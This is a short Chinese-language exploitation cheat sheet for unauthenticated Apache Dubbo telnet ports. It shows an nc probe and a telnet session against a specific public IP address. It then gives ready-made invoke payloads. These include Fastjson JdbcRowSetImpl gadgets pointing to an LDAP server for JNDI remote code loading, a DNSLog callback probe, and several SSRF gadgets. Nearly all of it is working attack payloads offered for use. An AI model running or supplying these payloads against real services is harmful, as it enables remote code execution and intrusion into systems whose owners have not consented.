1. Dubbo端口未授权访问

```
一条命令判断：
echo ls | nc -i 1 116.62.162.75 20880

telnet远程连接
root@vulhunt:~# telnet 116.62.162.75 20880
Trying 116.62.162.75...
Connected to 116.62.162.75.
Escape character is '^]'.

ls + 类 + 方法，查看注册的生产者，使用invoke未授权调用
dubbo>ls
com.yuntai.udb.facade.auth.UdbAuthorizeFacade
dubbo>

invoke调用方法，利用Fastjson漏洞

invoke com.baidu.updateDataMessage("aa",{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/ExportObject","autoCommit":true}}, "poc":11})

DNSLog
invoke com.baidu.hellofastjson("aa",{"name":{"@type":"java.net.Inet4Address","val":"dubbo.x57c6q.dnslog.cn"}})

SSRF利用： 
// 默认的成功过有效
invoke com.dubbo.DemoService("aa",{"@type":"javax.swing.JEditorPane","page": "http://127.0.0.1:8881?a=1&b=22222"})
// 需要依赖
invoke com.dubbo.DemoService("aa",{"name":{"@type":"org.apache.commons.jelly.impl.Embedded","script": "http://127.0.0.1:8881?aaaa=111&bb=242"}})
invoke com.dubbo.DemoService("aa",{"@type":"org.apache.cxf.jaxrs.utils.schemas.SchemaHandler","schemaLocations": "http://127.0.0.1:2323​4?a=1&b=22222"}）

```
参考：

    我的公众号文章

